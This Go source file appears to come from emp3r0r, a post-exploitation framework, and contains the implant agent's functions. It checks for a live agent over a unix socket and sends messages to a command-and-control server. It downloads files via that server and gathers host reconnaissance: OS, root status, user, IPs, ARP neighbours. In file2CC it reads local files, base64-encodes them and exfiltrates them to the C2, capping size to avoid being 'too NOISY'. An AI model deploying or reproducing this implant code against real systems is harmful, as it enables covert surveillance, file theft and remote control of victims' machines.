package agent

import (
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"os/user"
	"runtime"
	"time"

	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/zcalusic/sysinfo"
)

// is the agent alive?
// connect to SocketName, send a message, see if we get a reply
func IsAgentAlive() bool {
	log.Println("Testing if agent is alive...")
	c, err := net.Dial("unix", SocketName)
	if err != nil {
		log.Printf("Seems dead: %v", err)
		return false
	}
	defer c.Close()

	replyFromAgent := make(chan string, 1)
	reader := func(r io.Reader) {
		buf := make([]byte, 1024)
		for {
			n, err := r.Read(buf[:])
			if err != nil {
				return
			}
			replyFromAgent <- string(buf[0:n])
		}
	}

	// listen for reply from agent
	go reader(c)

	// send hello to agent
	for {
		_, err := c.Write([]byte("emp3r0r"))
		if err != nil {
			log.Print("write error:", err)
			break
		}
		if <-replyFromAgent == "emp3r0r" {
			log.Println("Yes it's alive")
			return true
		}
		time.Sleep(1e9)
	}

	return false
}

// Send2CC send TunData to CC
func Send2CC(data *MsgTunData) error {
	var out = json.NewEncoder(H2Json)

	err := out.Encode(data)
	if err != nil {
		return errors.New("Send2CC: " + err.Error())
	}
	return nil
}

// DownloadViaCC download via EmpHTTPClient
// if path is empty, return []data instead
func DownloadViaCC(url, path string) (data []byte, err error) {
	var resp *http.Response
	resp, err = HTTPClient.Get(url)
	if err != nil {
		return
	}
	log.Printf("DownloadViaCC: downloading from %s to %s...", url, path)
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("Error, status code %d", resp.StatusCode)
	}

	data, err = ioutil.ReadAll(resp.Body)
	defer resp.Body.Close()
	if err != nil {
		return
	}

	if path != "" {
		return nil, ioutil.WriteFile(path, data, 0600)
	}
	return
}

// CollectSystemInfo build system info object
func CollectSystemInfo() *SystemInfo {
	var (
		si   sysinfo.SysInfo
		info SystemInfo
	)
	si.GetSysInfo() // read sysinfo

	info.Tag = Tag

	info.OS = fmt.Sprintf("%s %s", si.OS.Name, si.OS.Version)
	hostname, err := os.Hostname()
	if err != nil {
		log.Printf("Gethostname: %v", err)
		hostname = "unknown_host"
	}
	info.Hostname = hostname
	info.Kernel = si.Kernel.Release
	info.Arch = runtime.GOARCH
	info.CPU = util.GetCPUInfo()
	info.Mem = fmt.Sprintf("%d MB", util.GetMemSize())
	info.Hardware = util.CheckProduct()
	info.Container = CheckContainer()
	info.Transport = Transport

	// have root?
	info.HasRoot = os.Geteuid() == 0

	// process
	info.Process = CheckAgentProcess()

	// user account info
	u, err := user.Current()
	if err != nil {
		log.Println(err)
		info.User = "Not available"
	}
	info.User = fmt.Sprintf("%s (%s), uid=%s, gid=%s", u.Username, u.HomeDir, u.Uid, u.Gid)

	// is cc on tor?
	info.HasTor = tun.IsTor(CCAddress)

	// has internet?
	info.HasInternet = tun.HasInternetAccess()

	// IP address?
	info.IPs = tun.IPa()

	// arp -a ?
	info.ARP = IPNeigh()

	return &info
}

// send local file to CC
func file2CC(filepath string) (checksum string, err error) {
	// open and read the target file
	f, err := os.Open(filepath)
	if err != nil {
		return
	}
	bytes, err := ioutil.ReadAll(f)
	if err != nil {
		return
	}
	// file sha256sum
	sum := sha256.Sum256(bytes)
	checksum = fmt.Sprintf("%x", sum)

	// file size
	size := len(bytes)
	sizemB := float32(size) / 1024 / 1024
	if sizemB > 20 {
		return checksum, errors.New("please do NOT transfer large files this way as it's too NOISY, aborting")
	}

	// base64 encode
	payload := base64.StdEncoding.EncodeToString(bytes)

	fileData := MsgTunData{
		Payload: "FILE" + OpSep + filepath + OpSep + payload,
		Tag:     Tag,
	}

	// send
	return checksum, Send2CC(&fileData)
}
